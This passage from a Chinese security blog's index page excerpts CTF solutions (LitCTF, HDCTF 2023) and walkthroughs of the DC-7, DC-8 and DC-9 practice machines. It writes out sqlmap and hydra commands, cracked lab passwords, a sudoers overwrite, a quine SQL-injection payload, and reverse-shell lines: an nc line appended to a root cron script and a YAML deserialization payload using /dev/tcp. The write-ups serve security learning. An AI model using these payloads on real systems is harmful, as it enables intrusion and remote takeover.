encoded_text = &quot;坤乾兑艮兑坎坤坤巽震坤巽震艮兑坎坤震兑乾坤巽坤艮兑震巽坤巽艮坤巽艮艮兑兑艮震兑乾坤乾坤坤兑艮艮坤巽坤坤巽坎坤兑离坎震艮兑坤巽坎艮兑震坤震兑乾坤乾坎坤兑坎坤震艮离坤离乾艮震艮巽震离震坤巽兑艮兑坎坤震巽艮坤离乾艮坎离坤震巽坎坤兑坤艮兑震巽震巽坎坤巽坤艮兑兑坎震巽兑&quot; 

res = &#39;&#39;
for i in encoded_text:
    res += _hash[i]
print(res)
tem = &#39;&#39;
flag = &#39;&#39;
for i in range(len(res)):
    tem += res[i]        
    if (i+1) %  10 == 0:
        flag += chr(int(tem,2))
        tem = &#39;&#39;
print(&quot;LitCTF&#123;&quot;+flag+&quot;&#125;&quot;)
</code></pre>
<h2 id="校外-赛博算命"><a href="#校外-赛博算命" class="headerlink" title="(校外)赛博算命"></a>(校外)赛博算命</h2><p><img src="https://img-blog.csdnimg.cn/877741123fa34b1bb6f6a71999a4a387.png" alt="在这里插入图片描述"></p>
<pre><code class="python"># assert flag = &#39;LitCTF&#123;xxxxxx_xxxx_xx&#125;&#39;
#      噬嗑    渐      临      蒙      升      履 
# 未济 讼 讼 涣 益 益 夬 否 渐 涣 旅 夬 小畜 未济 
# 同人
# 001100  101001  110100                   
# L       i       t       C       T       F
# flag[i] = func_A (func_B (str[i]) + 64);
flag = &#39;&#39;
enc = []

enc.append(&#39;未济&#39;) 
enc.append(&#39;讼&#39;) 
enc.append(&#39;讼&#39;) 
enc.append(&#39;涣&#39;) 
enc.append(&#39;益&#39;) 
enc.append(&#39;益&#39;) 
enc.append(&#39;夬&#39;) 
enc.append(&#39;否&#39;) 
enc.append(&#39;渐&#39;) 
enc.append(&#39;涣&#39;) 
enc.append(&#39;旅&#39;) 
enc.append(&#39;夬&#39;) 
enc.append(&#39;小畜&#39;) 
enc.append(&#39;未济&#39;) 
print(enc)
dic = &#123;&quot;未济&quot;:&#39;101010&#39;,&quot;讼&quot;:&#39;111010&#39;,&quot;涣&quot;:&#39;110010&#39;,&quot;益&quot;:&#39;110001&#39;,&quot;夬&quot;:&#39;011111&#39;,&quot;否&quot;:&#39;111000&#39;,&quot;渐&quot;:&#39;110100&#39;,&quot;旅&quot;:&#39;101100&#39;,&quot;小畜&quot;:&#39;110111&#39;&#125;
res = &#39;&#39;
for i in enc:
    res += chr(int(dic[i],2) + 64)    
print(&#39;LitCTF&#123;&#39;+res+&#39;&#125;&#39;)
</code></pre>
<p>这里说一下思路<br>首先把字符对应的<code>LITCTF&#123;</code>   <code>&#125;</code>给去了,少写点<br>然后这些是百度找卦象的图,全的那个算1 残的那个算0<br>卦转10进制+48再转ascii就行了</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>最终排名35<br>acm出不了一点,pwn爷还在成长,总体来说大伙稍微能做点题了</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/vim/" style="color: #03a9f4">vim</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #00a596">数据库</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E7%BC%96%E8%BE%91%E5%99%A8/" style="color: #03a9f4">编辑器</a>
        </span>
        
    </div>
    <a href="/2023/05/14/LITCTF2023%20%E9%83%A8%E5%88%86WP/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/12/DC-9%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
        <h2 class="post-title">DC-9通关详解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/12
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/56a20a36ac8e480b82e5d18851b3a945.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b658620582e5411c962472ea67afb604.png" alt="在这里插入图片描述"></p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p><img src="https://img-blog.csdnimg.cn/b32f811cd6d24014ab4115035753b5c6.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9e30c2bbd0cb43feac7a5b141588db74.png" alt="在这里插入图片描述"><br><code>result.php</code>处存在sql注入<br>sqlmap跑信息<br><code>python sqlmap.py -u http://192.168.45.146/results.php --data search=1 -D users -T UserDetails --dump</code><br><img src="https://img-blog.csdnimg.cn/edf34e037bbd47bca778564800424bd0.png" alt="在这里插入图片描述"><br>拿了几个尝试登录都无效<br>ssh尝试登录直接拒绝了<br>再看Staff表<br><img src="https://img-blog.csdnimg.cn/a7cc08d1f6574e4982ef50808830850b.png" alt="在这里插入图片描述"><br>查哈希<br><img src="https://img-blog.csdnimg.cn/8eafce750f1049f28a357448e42c48d0.png" alt="在这里插入图片描述"><br>进后台<br>多了一个添加记录的功能<br>没啥用,不能–os-shell</p>
<p>发现一个细节<br><img src="https://img-blog.csdnimg.cn/9c19a2dbbb374a6eacd49ab4272be15a.png" alt="在这里插入图片描述"><br>猜测是文件包含<br>猜传的值,或者bp爆破<br><img src="https://img-blog.csdnimg.cn/ba0bd48eae8b49c9b3d1119079030f0d.png" alt="在这里插入图片描述"><br>尝试php:&#x2F;&#x2F;input和日志文件包含均无果<br>然后没辙了</p>
<p>看wp得知有knock服务</p>
<p>正常应该先读<code>proc/sched_debug</code> 得知存在该服务<br><img src="https://img-blog.csdnimg.cn/5eef7917b3c040fd8bb046b15cc7f8e1.png" alt="在这里插入图片描述"><br>再读该服务的配置<br><code>/etc/knockd.conf</code><br><img src="https://img-blog.csdnimg.cn/76582fc6308547658112b614c2f99ee9.png" alt="在这里插入图片描述"></p>
<p>得知需要以此向<br>7469 8475 9842端口发syn包</p>
<p><img src="https://img-blog.csdnimg.cn/6f0b665f2a4a463d82ddf5f64eaa9c32.png" alt="在这里插入图片描述"><br>这就算打开了ssh服务了<br>再去比较之前sql注入得到的用户名和etc&#x2F;passwd下的用户名看看能否登录一个进去</p>
<p>写一个user.txt和pass.txt用hydra爆破<br>user.txt是&#x2F;etc&#x2F;passwd的下半部分<br><img src="https://img-blog.csdnimg.cn/48353f283a10492fac7c2bc80644ab11.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/94cddcbbb74140be9d77bb1167b97bf3.png" alt="在这里插入图片描述"></p>
<p><code>hydra -L user.txt  -P pass.txt ssh://192.168.45.146  -t 32</code></p>
<p><img src="https://img-blog.csdnimg.cn/99c87a30f6ae40cfb5a7646cfa127ffc.png" alt="在这里插入图片描述"></p>
<p>账号<code>janitor</code><br>密码<code>Ilovepeepee</code></p>
<p>账号<code>chandlerb</code><br>密码<code>UrAG0D!</code></p>
<p>账号<code>joeyt</code><br>密码<code>Passw0rd</code></p>
<p>登录</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>传个LinEnum.sh过来枚举脆弱性<br>没什么可利用的<br>那一个个账户看</p>
<p>都没有sudo权限</p>
<p>在janitor下发现隐藏文件<br><img src="https://img-blog.csdnimg.cn/c90092002a5443ebb531aae3a86d9988.png" alt="在这里插入图片描述"><br>一堆密码,尝试ssh爆</p>
<p><img src="https://img-blog.csdnimg.cn/633739844e2343488f257989bfa21e4e.png" alt="在这里插入图片描述"><br>上fredf用户<br><img src="https://img-blog.csdnimg.cn/1c373a3aae174954901dc7a6b7399339.png" alt="在这里插入图片描述"><br>发现可以以root身份运行<code>/opt/devstuff/dist/test/test</code><br>那么去读源文件<br><img src="https://img-blog.csdnimg.cn/af8ed8bde084422493d27aac522004b1.png" alt="在这里插入图片描述"><br>将第一个参数的值写到第二个参数里<br>那么我们可以尝试给 当前用户所有权限<br><code>echo &#39;fredf ALL=(ALL:ALL) ALL&#39; &gt;/tmp/a.txt</code><br><code>sudo ./test /tmp/a.txt /etc/sudoers</code></p>
<p>这里我写错了给文件干烂了,直接不能sudo了</p>
<p>看了下wp后面就结束了</p>
<p>这里运行完之后执行<code>sudo su -</code>就行了<br>难顶</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00a596">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #ffa2c4">php</a>
        </span>
        
    </div>
    <a href="/2023/05/12/DC-9%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/07/DC-8%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
        <h2 class="post-title">DC-8通关详解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/7
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/ad9c6d1a5a0647a8a98d8a70d8fccaf9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/667d4b31d6ed48a0a0cca960bbf1889e.png" alt="在这里插入图片描述"></p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p><img src="https://img-blog.csdnimg.cn/2d6db0eb12ea487ca8ef7ec6c561dde8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/24d21b2114fd44108dc73d5c99b3384d.png" alt="在这里插入图片描述"><br>找个扫描器扫一下<br><img src="https://img-blog.csdnimg.cn/0f9064d91cde4a948291fd57b68c31f4.png" alt="在这里插入图片描述"><br>msf试了几个exp都没用<br>那么手动找找<br>发现传参nid出存在sql注入</p>
<p><code>python sqlmap -u &quot;http://192.168.45.144:80/?nid=1&quot; --union-cols=1 -D d7db -T users -C name,pass --columns --tables --dump</code></p>
<p><img src="https://img-blog.csdnimg.cn/915f1dd9d05b49529852b506ff4b12d5.png" alt="在这里插入图片描述"><br>用john爆密码<br>admin爆了20分钟没爆出来</p>
<p>john的密码<img src="https://img-blog.csdnimg.cn/43be3dbb4c534c05b95bf4657e132f1e.png" alt="在这里插入图片描述"><br>尝试ssh和后台登录<br>ssh进不去<br><img src="https://img-blog.csdnimg.cn/19ae6ed9931e41fcaf793252b3aa3edb.png" alt="在这里插入图片描述"><br>这里一直没打成功(当时没试着去提交),然后我就手贱给他删了…<br>自己再添加一个,提交执行<br><img src="https://img-blog.csdnimg.cn/856fd984a695448db973c2a85ad4ef5a.png" alt="在这里插入图片描述"><br>拿到shell<br><img src="https://img-blog.csdnimg.cn/dbe547d559da44d284b21ce60ab76483.png" alt="在这里插入图片描述"></p>
<h1 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h1><p>优化shell</p>
<pre><code class="bash">python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
ctrl+z
stty -echo raw;fg
</code></pre>
<p>cd到&#x2F;tmp目录下<br>从vps上下载LinEnum.sh枚举脆弱性<br><img src="https://img-blog.csdnimg.cn/e3ddc9f624a74a478a2fa2dfa9ab3a43.png" alt="在这里插入图片描述"><br>发现存在exim4 看看能否尝试用这个提权<br><img src="https://img-blog.csdnimg.cn/939996e4d8d74ddf885814c42a04a948.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5783be96cc4a4fd59de7c2124b935410.png" alt="在这里插入图片描述"><br>试了一下<code>linux/local/46996.sh</code>,失败了,返回的还是www-data<br>找了一圈没发现什么办法,看看wp<br>发现别46996.sh成功了?</p>
<p>那么再尝试一遍,scp传到vps<br>wget下载<br>发现运行报错<br><img src="https://img-blog.csdnimg.cn/44af06483f294d03a6f55490b7460d5a.png" alt="在这里插入图片描述"><br>kali用<code>dos2unix</code>转换完文件再传过去,执行<br>还是www-data</p>
<p>发现是操作问题导致的,这个默认的用法不行<br>得<code>-m netcat</code><br><img src="https://img-blog.csdnimg.cn/6969b93f7b8741d8bdd3c7443e992e84.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/f7d015dda6e2401484844a7d73ae6e3a.png" alt="在这里插入图片描述"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #ffa2c4">linux</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #ff7d73">运维</a>
        </span>
        
    </div>
    <a href="/2023/05/07/DC-8%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/30/DC-7%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
        <h2 class="post-title">DC-7通关详解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/30
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/856e0fdcd1034dad80369f7c6a378f8a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/09ea3b35b6dc45dda26125567e714220.png" alt="在这里插入图片描述"></p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p><img src="https://img-blog.csdnimg.cn/dc3aabab1bfb4ce9a8233babadef0f77.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3351f2de5fc144339585dce86d62b872.png" alt="在这里插入图片描述"><br>web提示我们说弱口令可能不会奏效</p>
<p>那么我们就先不考虑弱口令<br>searchsploit搜payload打打看,无果</p>
<p>看别人的wp知道了是通过web左下角的这个玩意去github搜<br><img src="https://img-blog.csdnimg.cn/cb6316bea7fa424883ae46ddfda57a16.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/372cc29425024a9da80ae91d2737618d.png" alt="在这里插入图片描述"><br>在这个仓库用户唯一的仓库中看config.php<br>发现账号密码</p>
<p><img src="https://img-blog.csdnimg.cn/f791d54185724161a3049a294a3cee3d.png" alt="在这里插入图片描述"><br>尝试后台和ssh登录</p>
<p>ssh登录成功</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>当前目录下发现mbox和backup文件夹<br>看看都是什么<br>backup目录下是俩挺大的压缩包<br>cat 一下mbox<br><img src="https://img-blog.csdnimg.cn/2163c3c2ce0649a1ba953b30a77f2472.png" alt="在这里插入图片描述"></p>
<p>然后看看<code>/opt/scripts/backups.sh</code></p>
<p><img src="https://img-blog.csdnimg.cn/5c3b63ddef6346ebb1ba9dd7b966a7ce.png" alt="在这里插入图片描述"><br>没什么用,我们写不了该文件,但是发现www-data组可写<br>没思路了,也不能su过去,回头看一眼wp</p>
<p>发现<code>/home/dc7user</code>目录下还存在一个<code>.drush</code>目录,当时根本没在意,没怎么见过这东西<br>drush是个命令,可以管理drupal</p>
<p>cd到&#x2F;var&#x2F;www&#x2F;html下<br><img src="https://img-blog.csdnimg.cn/5ae9faba33c4494396f89366c5c292f8.png" alt="在这里插入图片描述"></p>
<p>改admin的密码,用web弹个shell<br>和之前做的drupal的站一样,去扩展里找支持php解析的扩展,给他启用<br>发现这里没有,去下一个<br><code>https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz </code><br>装完后启用,然后写一句话反弹shell<br>优化shell</p>
<pre><code class="bash">python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
ctrl+z
stty -echo raw;fg
</code></pre>
<p>现在有写的权限,在sh文件最后追加一个命令<br>等这个命令被root执行生成一个shell</p>
<pre><code class="bash">echo &quot;nc -e /bin/bash vps地址 9000&quot; &gt;&gt; backups.sh
</code></pre>
<p>等15分钟,每15分钟执行一次,可以用date命令查看大概差多长时间<br>最好先自己手动执行看看能不能反弹上,省得再等15分钟<br><img src="https://img-blog.csdnimg.cn/9f1e88d95e0448d4886b247e0024a40b.png" alt="在这里插入图片描述"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ff7d73">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #00bcd4">php</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #ffa2c4">linux</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/ssh/" style="color: #ff7d73">ssh</a>
        </span>
        
    </div>
    <a href="/2023/04/30/DC-7%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/04/24/HDCTF%202023%20%E5%A4%8D%E7%9B%98/">
        <h2 class="post-title">HDCTF 2023 复盘</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/4/24
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="yamiyami"><a href="#yamiyami" class="headerlink" title="yamiyami"></a>yamiyami</h2><p>当时考虑直接读的<code>/proc/self/environ</code><br>读到flag是not_flag<br>就没考虑过<code>/proc/1/environ</code>了<br>然后不知道py3URL二次编码的特性,读不到源码,无从下手<br>做flask算pin码的题做多了,还以为pid是1的就是self,难顶</p>
<p>上面那种是非预期<br>预期是yaml反序列化</p>
<p>先读源码<br><code>/read?url=file:///%25%36%31%25%37%30%25%37%30%25%32%66%25%36%31%25%37%30%25%37%30%25%32%65%25%37%30%25%37%39</code></p>
<pre><code class="python">
#encoding:utf-8
import os
import re, random, uuid
from flask import *
from werkzeug.utils import *
import yaml
from urllib.request import urlopen
app = Flask(__name__)
random.seed(uuid.getnode())
app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233)
app.debug = False
BLACK_LIST=[&quot;yaml&quot;,&quot;YAML&quot;,&quot;YML&quot;,&quot;yml&quot;,&quot;yamiyami&quot;]
app.config[&#39;UPLOAD_FOLDER&#39;]=&quot;/app/uploads&quot;

@app.route(&#39;/&#39;)
def index():
    session[&#39;passport&#39;] = &#39;YamiYami&#39;
    return &#39;&#39;&#39;
    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;
    &lt;br&gt;
    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;
    &lt;br&gt;
    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;
    &#39;&#39;&#39;
@app.route(&#39;/pwd&#39;)
def pwd():
    return str(pwdpath)
@app.route(&#39;/read&#39;)
def read():
    try:
        url = request.args.get(&#39;url&#39;)
        m = re.findall(&#39;app.*&#39;, url, re.IGNORECASE)
        n = re.findall(&#39;flag&#39;, url, re.IGNORECASE)
        if m:
            return &quot;re.findall(&#39;app.*&#39;, url, re.IGNORECASE)&quot;
        if n:
            return &quot;re.findall(&#39;flag&#39;, url, re.IGNORECASE)&quot;
        res = urlopen(url)
        return res.read()
    except Exception as ex:
        print(str(ex))
    return &#39;no response&#39;

def allowed_file(filename):
   for blackstr in BLACK_LIST:
       if blackstr in filename:
           return False
   return True
@app.route(&#39;/upload&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def upload_file():
    if request.method == &#39;POST&#39;:
        if &#39;file&#39; not in request.files:
            flash(&#39;No file part&#39;)
            return redirect(request.url)
        file = request.files[&#39;file&#39;]
        if file.filename == &#39;&#39;:
            return &quot;Empty file&quot;
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            if not os.path.exists(&#39;./uploads/&#39;):
                os.makedirs(&#39;./uploads/&#39;)
            file.save(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename))
            return &quot;upload successfully!&quot;
    return render_template(&quot;index.html&quot;)
@app.route(&#39;/boogipop&#39;)
def load():
    if session.get(&quot;passport&quot;)==&quot;Welcome To HDCTF2023&quot;:
        LoadedFile=request.args.get(&quot;file&quot;)
        if not os.path.exists(LoadedFile):
            return &quot;file not exists&quot;
        with open(LoadedFile) as f:
            yaml.full_load(f)
            f.close()
        return &quot;van you see&quot;
    else:
        return &quot;No Auth bro&quot;
if __name__==&#39;__main__&#39;:
    pwdpath = os.popen(&quot;pwd&quot;).read()
    app.run(
        debug=False,
        host=&quot;0.0.0.0&quot;
    )
    print(app.config[&#39;SECRET_KEY&#39;])
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/b2857d342e1b4f5997bd8746c8a30735.png" alt="在这里插入图片描述"><br>在&#x2F;boogipop路径下可触发反序列化<br>但是能进语句的条件是passport &#x3D;&#x3D; Welcome To HDCTF2023<br>那么我们需要伪造session<br><img src="https://img-blog.csdnimg.cn/71117d56ad844ab4bd9e4366600526e2.png" alt="在这里插入图片描述"></p>
<p>这是生成secret key的逻辑<br>uuid.getnode返回网卡的int值<br>那么我们去读网卡<br>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address<br>得到<br><img src="https://img-blog.csdnimg.cn/87387918f92c416393908fe5bb4e1856.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/b6d45568858a46afbb5c92f79bafc15b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/79ebe40fc43e4571b64eb607182607f2.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f6a0ddc3caea46b19de85d0c06747c58.png" alt="在这里插入图片描述"><br>验证是否伪造成功<br><img src="https://img-blog.csdnimg.cn/ccd333e5d9924b0093964ac12a8220ac.png" alt="在这里插入图片描述"><br>成功伪造了session<br>然后我们构造恶意yaml文件<br>我这里命名为ac.ac</p>
<pre><code class="yaml">!!python/object/new:str
    args: []
    state: !!python/tuple
      - &quot;__import__(&#39;os&#39;).system(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps地址/9000 &lt;&amp;1\&quot;&#39;)&quot;
      - !!python/object/new:staticmethod
        args: []
        state:
          update: !!python/name:eval
          items: !!python/name:list
</code></pre>
<p>触发<br><img src="https://img-blog.csdnimg.cn/8073dd513d6d4c84b1afdd8069861534.png" alt="在这里插入图片描述"><br>这里其实就拿到shell了,由于题目环境的问题是读不了flag的,还是得通过<code>/proc/1/environ</code>读</p>
<h2 id="LoginMaster"><a href="#LoginMaster" class="headerlink" title="LoginMaster"></a>LoginMaster</h2><p>robots.txt泄露waf<br><img src="https://img-blog.csdnimg.cn/908345a883c740e59813066ded420bea.png" alt="在这里插入图片描述"><br>发现是quine查询<br>payload如下<br><code>1&#39;union/**/select/**/replace(replace(&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="math-rsa"><a href="#math-rsa" class="headerlink" title="math_rsa"></a>math_rsa</h2><p>由题<br>p^2^ ≡ a mod r<br>即a是模p的二次剩余<br>通过sage求解p</p>
<pre><code class="python">r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299
a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625
R.&lt;x&gt; = PolynomialRing(Zmod(r))
f = x**2 - a
print(f.roots())
</code></pre>
<pre><code class="python">from Crypto.Util.number import *
import gmpy2
n = 14859096721972571275113983218934367817755893152876205380485481243331724183921836088288081702352994668073737901001999266644597320501510110156000004121260529706467596723314403262665291609405901413014268847623323618322794733633701355018297180967414569196496398340411723555826597629318524966741762029358820546567319749619243298957600716201084388836601266780686983787343862081546627427588380349419143512429889606408316907950943872684371787773262968532322073585449855893701828146080616188277162144464353498105939650706920663343245426376506714689749161228876988380824497513873436735960950355105802057279581583149036118078489
r = 145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299
a = 55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625
c = 12162333845365222333317364738458290101496436746496440837075952494841057738832092422679700884737328562151621948812616422038905426346860411550178061478808128855882459082137077477841624706988356642870940724988156263550796637806555269282505420720558849717265491643392140727605508756229066139493821648882251876933345101043468528015921111395602873356915520599085461538265894970248065772191748271175288506787110428723281590819815819036931155215189564342305674107662339977581410206210870725691314524812137801739246685784657364132180368529788767503223017329025740936590291109954677092128550252945936759891497673970553062223608
e=65537
p = 135098300162574110032318082604507116145598393187097375349178563291884099917465443655846455456198422625358836544141120445250413758672683505731015242196083913722084539762488109001442453793004455466844129788221721833309756439196036660458760461237225684006072689852654273913614912604470081753828559417535710077291
q = n // p
phi_n = (p-1)*(q-1)
d = gmpy2.invert(e,phi_n)
print(long_to_bytes(pow(c,d,n)).decode())
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/python/" style="color: #00bcd4">python</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/flask/" style="color: #ff7d73">flask</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%90%8E%E7%AB%AF/" style="color: #00bcd4">后端</a>
        </span>
        
    </div>
    <a href="/2023/04/24/HDCTF%202023%20%E5%A4%8D%E7%9B%98/" class="go-post">阅读全文</a>
</div>


        <div class="page-current">
    
    <a class="page-num" href="/page/4/">
        <i class="fa-solid fa-caret-left fa-fw"></i>
    </a>
    <a class="page-num" href="/">1</a>
    <span class="page-omit">...</span>
    
    <span class="current">5</span>
    
    <a class="page-num" href="/page/6">6</a>
    
    
    
    
    <a class="page-num" href="/page/6/">
        <i class="fa-solid fa-caret-right fa-fw"></i>
    </a>
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/Arcueid.jpg" alt="avatar" />
        </div>
        <div class="name">Arcueid</div>
        <div class="description">
            <p>Web + Crypto 苦手</p>

        </div>
        
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Arcueid&#39;s BLOG
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Arcueid
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
</body>
</html>
